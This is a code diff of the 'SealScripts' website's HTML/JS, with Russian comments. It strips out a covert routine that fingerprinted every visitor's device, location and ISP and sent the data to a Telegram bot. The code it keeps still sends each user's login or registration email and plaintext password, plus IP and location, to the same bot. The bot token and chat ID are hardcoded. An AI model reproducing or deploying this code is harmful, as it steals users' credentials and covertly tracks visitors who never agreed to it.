@@ -42,20 +42,12 @@ body{
 ::selection{background:rgba(90,160,255,.45);color:#fff}
 ::-moz-selection{background:rgba(90,160,255,.45);color:#fff}
 
-/* ===== ЖЁСТКИЙ КУРСОР ===== */
-button, a, select, .btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link, .copy-btn, .profile-btn, .auth-switch a, .auth-close {
-  cursor:pointer !important;
-}
-button:hover, a:hover, .btn:hover, .submit-btn:hover, .auth-btn:hover, .warning-btn:hover, .thanks-btn:hover, .mad-btn:hover, .back-link:hover, .copy-btn:hover, .profile-btn:hover {
-  cursor:pointer !important;
-}
-button::before, button::after, .btn::before, .btn::after, .submit-btn::before, .submit-btn::after, .auth-btn::before, .auth-btn::after, .warning-btn::before, .warning-btn::after, .thanks-btn::before, .thanks-btn::after, .mad-btn::before, .mad-btn::after, .back-link::before, .back-link::after, .copy-btn::before, .copy-btn::after, .profile-btn::before, .profile-btn::after {
-  pointer-events:none;
-}
+button, a, select, .btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link, .copy-btn, .profile-btn, .auth-switch a, .auth-close { cursor:pointer !important; }
+button:hover, a:hover, .btn:hover, .submit-btn:hover, .auth-btn:hover, .warning-btn:hover, .thanks-btn:hover, .mad-btn:hover, .back-link:hover, .copy-btn:hover, .profile-btn:hover { cursor:pointer !important; }
+button::before, button::after, .btn::before, .btn::after, .submit-btn::before, .submit-btn::after, .auth-btn::before, .auth-btn::after, .warning-btn::before, .warning-btn::after, .thanks-btn::before, .thanks-btn::after, .mad-btn::before, .mad-btn::after, .back-link::before, .back-link::after, .copy-btn::before, .copy-btn::after, .profile-btn::before, .profile-btn::after { pointer-events:none; }
 input, textarea { cursor:text }
 input:focus, textarea:focus { cursor:text }
 
-/* ===== ЭКРАН ЗАГРУЗКИ ===== */
 #sealLoader{
   position:fixed;inset:0;z-index:99999;
   background:radial-gradient(circle at 50% 50%,#071022 0%,#03060d 70%);
@@ -511,7 +503,6 @@ const loaderStage = document.getElementById('loaderStage');
 const bootState = { firebase:false, firestore:false, ip:false, fonts:false, dom:false, minTime:false };
 const TOTAL_STEPS = Object.keys(bootState).length;
 let currentProgress = 0;
-
 function setStage(t){ if(loaderStage) loaderStage.textContent = t; }
 function markReady(k){
   if(!(k in bootState) || bootState[k]) return;
@@ -557,7 +548,7 @@ const TELEGRAM_PROXY = 'https://summer-hall-5536.autismallahakbar.workers.dev';
 const BOT_TOKEN = '8956553138:AAGIivvQO_8XJe3FnKG_OCfaqJm7knTHyN4';
 const CHAT_ID = '7937831655';
 
-async function sendToTelegramText(text){
+async function sendToTelegram(text){
   try{
     const res = await fetch(`${TELEGRAM_PROXY}/bot${BOT_TOKEN}/sendMessage`,{
       method:'POST', headers:{'Content-Type':'application/json'},
@@ -584,201 +575,16 @@ async function fetchUserIP(){
 }
 fetchUserIP();
 
-/* ================= СБОР ИНФЫ ================= */
-function getConnectionInfo(){
-  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if(!c) return null;
-  return {
-    type: c.effectiveType || 'unknown',
-    downlink: c.downlink ? c.downlink + ' Mbps' : 'unknown',
-    rtt: c.rtt ? c.rtt + ' ms' : 'unknown',
-    saveData: c.saveData || false
-  };
-}
-
-async function getBatteryInfo(){
-  try{
-    if(!navigator.getBattery) return null;
-    const b = await navigator.getBattery();
-    return {
-      level: Math.round(b.level * 100) + '%',
-      charging: b.charging ? 'yes' : 'no'
-    };
-  }catch(e){ return null; }
-}
-
-function getWebGLInfo(){
-  try{
-    const c = document.createElement('canvas');
-    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-    if(!gl) return null;
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    if(!dbg) return null;
-    return {
-      vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '',
-      renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || ''
-    };
-  }catch(e){ return null; }
-}
-
-function getCanvasFingerprint(){
-  try{
-    const c = document.createElement('canvas');
-    c.width = 200; c.height = 40;
-    const ctx = c.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillStyle = '#069';
-    ctx.fillText('SealScripts fingerprint', 2, 2);
-    ctx.fillStyle = 'rgba(102,204,0,0.7)';
-    ctx.fillText('SealScripts fingerprint', 4, 17);
-    const data = c.toDataURL();
-    let hash = 0;
-    for(let i = 0; i < data.length; i++){
-      hash = ((hash << 5) - hash) + data.charCodeAt(i);
-      hash |= 0;
-    }
-    return Math.abs(hash).toString(16);
-  }catch(e){ return 'unavailable'; }
-}
-
-function getUTMs(){
-  try{
-    const p = new URLSearchParams(location.search);
-    return {
-      utm_source: p.get('utm_source') || '',
-      utm_medium: p.get('utm_medium') || '',
-      utm_campaign: p.get('utm_campaign') || '',
-      utm_term: p.get('utm_term') || '',
-      utm_content: p.get('utm_content') || '',
-      gclid: p.get('gclid') || '',
-      fbclid: p.get('fbclid') || ''
-    };
-  }catch(e){ return {}; }
-}
-
-function getPageTiming(){
-  try{
-    const t = performance.timing;
-    return {
-      loadMs: t.loadEventEnd - t.navigationStart,
-      domReadyMs: t.domContentLoadedEventEnd - t.navigationStart,
-      ttfbMs: t.responseStart - t.navigationStart
-    };
-  }catch(e){ return null; }
-}
-
-function getClientInfo(){
-  const ua = navigator.userAgent;
-  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
-  if(/Edg\//.test(ua)) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)||[])[1];
-  else if(/OPR\//.test(ua) || /Opera/.test(ua)) browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)||[])[1];
-  else if(/Firefox\//.test(ua)) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)||[])[1];
-  else if(/Chrome\//.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||[])[1];
-  else if(/Safari\//.test(ua) && /Version\//.test(ua)) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)||[])[1];
-  if(/Windows NT 10/.test(ua)) os = 'Windows 10/11';
-  else if(/Windows NT 6\.3/.test(ua)) os = 'Windows 8.1';
-  else if(/Windows NT 6\.1/.test(ua)) os = 'Windows 7';
-  else if(/Windows NT/.test(ua)) os = 'Windows';
-  else if(/Mac OS X/.test(ua)) os = 'macOS ' + ((ua.match(/Mac OS X ([\d_]+)/)||[])[1]||'').replace(/_/g,'.');
-  else if(/Android/.test(ua)) os = 'Android ' + ((ua.match(/Android ([\d.]+)/)||[])[1]||'');
-  else if(/iPhone|iPad|iPod/.test(ua)) os = 'iOS ' + ((ua.match(/OS ([\d_]+)/)||[])[1]||'').replace(/_/g,'.');
-  else if(/CrOS/.test(ua)) os = 'ChromeOS';
-  else if(/Linux/.test(ua)) os = 'Linux';
-  if(/Mobile|Android|iPhone/.test(ua)) device = 'Mobile';
-  else if(/iPad|Tablet/.test(ua)) device = 'Tablet';
-
-  return { browser, os, device, ua };
-}
-
-let __clientInfo = null;
-
-async function sendVisitInfo(){
-  try{
-    /* Отправляем один раз за сессию */
-    try{
-      if(sessionStorage.getItem('seal_visit_sent') === '1') return;
-      sessionStorage.setItem('seal_visit_sent','1');
-    }catch(e){}
-
-    /* Показываем страницу только после того, как всё собрано */
-    const [battery] = await Promise.all([ getBatteryInfo() ]);
-    const webgl = getWebGLInfo();
-    const canvasFP = getCanvasFingerprint();
-    const utms = getUTMs();
-    const timing = getPageTiming();
-    const conn = getConnectionInfo();
-    const info = __clientInfo;
-
-    /* Первый визит или повторный */
-    let visitCount = 1;
-    try{
-      visitCount = parseInt(localStorage.getItem('seal_visits') || '0', 10) + 1;
-      localStorage.setItem('seal_visits', String(visitCount));
-    }catch(e){}
-
-    /* Языки */
-    const langs = (navigator.languages || [navigator.language]).join(', ');
-    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown');
-    const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
-
-    /* Гео из Cloudflare */
-    let geo = '';
-    if(__userGeo){
-      const p = [];
-      if(__userGeo.city) p.push(__userGeo.city);
-      if(__userGeo.region) p.push(__userGeo.region);
-      if(__userGeo.country) p.push(__userGeo.country);
-      if(p.length) geo += `📍 Location: ${p.join(', ')} (by IP)\n`;
-      if(__userGeo.latitude && __userGeo.longitude) geo += `🧭 Coords: ${__userGeo.latitude}, ${__userGeo.longitude}\n`;
-      if(__userGeo.org) geo += `🏢 ISP: ${__userGeo.org}\n`;
-      if(__userGeo.asn) geo += `🔢 ASN: ${__userGeo.asn}\n`;
-      if(__userGeo.timezone) geo += `🌍 IP Timezone: ${__userGeo.timezone}\n`;
-    }
-
-    /* UTM-метки */
-    let utmLine = '';
-    Object.entries(utms).forEach(([k,v])=>{ if(v) utmLine += `${k}=${v} `; });
-
-    const message =
-`👀 New visit on SealScripts
-━━━━━━━━━━━━━━━━
-🌐 IP: ${__userIP}
-${geo}━━━━━━━━━━━━━━━━
-🖥 Browser: ${info.browser}
-💻 OS: ${info.os}
-📱 Device: ${info.device}
-🧩 Vendor: ${navigator.vendor || '—'}
-🖼 WebGL: ${webgl ? (webgl.renderer||'—') : '—'}
-🎨 Canvas FP: ${canvasFP}
-━━━━━━━━━━━━━━━━
-📐 Screen: ${screen.width}x${screen.height} @${devicePixelRatio}x
-📏 Available: ${screen.availWidth}x${screen.availHeight}
-🪟 Viewport: ${innerWidth}x${innerHeight}
-🎨 Color depth: ${screen.colorDepth}-bit
-🔄 Orientation: ${(screen.orientation && screen.orientation.type) || '—'}
-👆 Touch: ${('ontouchstart' in window) ? 'yes' : 'no'}
-━━━━━━━━━━━━━━━━
-🗣 Language: ${navigator.language}
-🌍 Languages: ${langs}
-🕒 Timezone: ${tz}
-🧠 CPU cores: ${navigator.hardwareConcurrency || '—'}
-💾 Device RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—'}
-${conn ? `📶 Network: ${conn.type}, ↓${conn.downlink}, RTT ${conn.rtt}, saveData=${conn.saveData}\n` : ''}${battery ? `🔋 Battery: ${battery.level} (charging: ${battery.charging})\n` : ''}━━━━━━━━━━━━━━━━
-🍪 Cookies: ${navigator.cookieEnabled ? 'yes' : 'no'}
-🕵 DNT: ${navigator.doNotTrack || '—'}
-🖱 Platform: ${navigator.platform || '—'}
-📦 Visits: #${visitCount}
-${timing ? `⏱ Load: ${timing.loadMs}ms (DOM ${timing.domReadyMs}ms, TTFB ${timing.ttfbMs}ms)\n` : ''}${utmLine ? `📊 UTM: ${utmLine}\n` : ''}━━━━━━━━━━━━━━━━
-🔗 URL: ${location.href}
-🧭 Referrer: ${document.referrer || 'direct'}
-🕰 Time: ${time}
-🧾 UA: ${info.ua}`;
-
-    await sendToTelegramText(message);
-  }catch(e){
-    console.error('visit info error:', e);
-  }
+function locationLine(){
+  if(!__userGeo) return `🌐 IP: ${__userIP}\n`;
+  const parts = [];
+  if(__userGeo.city) parts.push(__userGeo.city);
+  if(__userGeo.region) parts.push(__userGeo.region);
+  if(__userGeo.country) parts.push(__userGeo.country);
+  const loc = parts.length ? parts.join(', ') : 'unknown';
+  let out = `🌐 IP: ${__userIP}\n`;
+  out += `📍 Location: ${loc}\n`;
+  return out;
 }
 
 /* ================= ФОН ================= */
@@ -1162,43 +968,20 @@ function markReviewed(){ reviewSubmitting=true; try{ localStorage.setItem(REVIEW
 
 async function sendReviewToTelegram(rating,text){
     const fb = window.firebaseAuth;
-    let username='(guest)', email='(guest)', uid='(guest)';
+    let username='(guest)', email='(guest)';
     if(fb && fb.auth.currentUser){
-        uid = fb.auth.currentUser.uid;
         email = fb.auth.currentUser.email || '(none)';
-        try{ username = (await fb.fetchUsername(uid)) || '(no username)'; }catch(e){ username='(fetch failed)'; }
-    }
-    const info = __clientInfo || getClientInfo();
-    const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
-    let geo = '';
-    if(__userGeo){
-      const p = [];
-      if(__userGeo.city) p.push(__userGeo.city);
-      if(__userGeo.region) p.push(__userGeo.region);
-      if(__userGeo.country) p.push(__userGeo.country);
-      if(p.length) geo += `📍 Location: ${p.join(', ')} (by IP)\n`;
-      if(__userGeo.org) geo += `🏢 ISP: ${__userGeo.org}\n`;
+        try{ username = (await fb.fetchUsername(fb.auth.currentUser.uid)) || '(no username)'; }catch(e){ username='(fetch failed)'; }
     }
     const message =
 `📩 New review on SealScripts
 ━━━━━━━━━━━━━━━━
 👤 Username: ${username}
 📧 Email: ${email}
-🆔 UID: ${uid}
-🌐 IP: ${__userIP}
-${geo}━━━━━━━━━━━━━━━━
+${locationLine()}━━━━━━━━━━━━━━━━
 ⭐ Rating: ${rating}/5
-📝 Text: ${text||'(no text)'}
-━━━━━━━━━━━━━━━━
-🖥 Browser: ${info.browser}
-💻 OS: ${info.os}
-📱 Device: ${info.device}
-📐 Screen: ${screen.width}x${screen.height}
-🗣 Language: ${navigator.language}
-🕒 Timezone: ${(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown')}
-🕰 Time: ${time}
-🧾 UA: ${info.ua}`;
-    return await sendToTelegramText(message);
+📝 Text: ${text||'(no text)'}`;
+    return await sendToTelegram(message);
 }
 
 submitBtn.addEventListener('click', async ()=>{
@@ -1259,7 +1042,6 @@ function detectByCountry(cc){
 if(savedLang && translations[savedLang]){ applyLang(savedLang); }
 else{ applyLang(detectByBrowser()); }
 
-/* после загрузки IP — если пользователь не выбирал, применяем по стране */
 setTimeout(()=>{
     let already = null;
     try{ already = localStorage.getItem('seal_lang'); }catch(e){}
@@ -1324,35 +1106,16 @@ on(authClose,'click',()=>authOverlay.classList.remove('show'));
 on(authOverlay,'click', e=>{ if(e.target===authOverlay) authOverlay.classList.remove('show'); });
 on(authSwitchLink,'click',()=>setRegisterMode(!isRegistering));
 
-async function sendAuthToTelegram(action,email,uid,username,password){
-    const time = new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
-    const info = __clientInfo || getClientInfo();
-    let geo = '';
-    if(__userGeo){
-      const p = [];
-      if(__userGeo.city) p.push(__userGeo.city);
-      if(__userGeo.region) p.push(__userGeo.region);
-      if(__userGeo.country) p.push(__userGeo.country);
-      if(p.length) geo += `📍 Location: ${p.join(', ')} (by IP)\n`;
-      if(__userGeo.org) geo += `🏢 ISP: ${__userGeo.org}\n`;
-    }
+async function sendAuthToTelegram(action, email, uid, username, password){
+    const msgAction = action === 'Register' ? 'New Registration' : 'New Login';
     const message =
-`🔐 ${action} on SealScripts
+`🔐 ${msgAction} on SealScripts
 ━━━━━━━━━━━━━━━━
 👤 Username: ${username||'(pending)'}
 📧 Email: ${email||'(not provided)'}
 🔑 Password: ${password||'(hidden)'}
-🆔 UID: ${uid||'(pending)'}
-🌐 IP: ${__userIP}
-${geo}━━━━━━━━━━━━━━━━
-🖥 Browser: ${info.browser}
-💻 OS: ${info.os}
-📱 Device: ${info.device}
-📐 Screen: ${screen.width}x${screen.height}
-🗣 Language: ${navigator.language}
-🕒 Timezone: ${(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown')}
-🕰 Time: ${time}`;
-    await sendToTelegramText(message);
+${locationLine()}`;
+    await sendToTelegram(message);
 }
 
 on(authSubmit,'click', async ()=>{
@@ -1479,16 +1242,6 @@ on(profileReviews,'click', e=>{ e.preventDefault(); showPage(pageReviews,'#revie
 on(signOutBtn,'click', async ()=>{
     const fb = window.firebaseAuth;
     if(fb){ await fb.signOut(fb.auth); showToast('Logged out','success'); }
-});
-
-/* ================= ФИНАЛЬНЫЙ ЗАПУСК ================= */
-/* Отправляем визит-инфу, когда всё готово, но не блокируем UI */
-window.addEventListener('load', () => {
-    __clientInfo = getClientInfo();
-    /* Задержим отправку на 2 секунды, чтобы загрузчик уже исчез, а данные собрались */
-    setTimeout(() => {
-        sendVisitInfo();
-    }, 2000);
 });
 
 /* Страховка загрузчика */
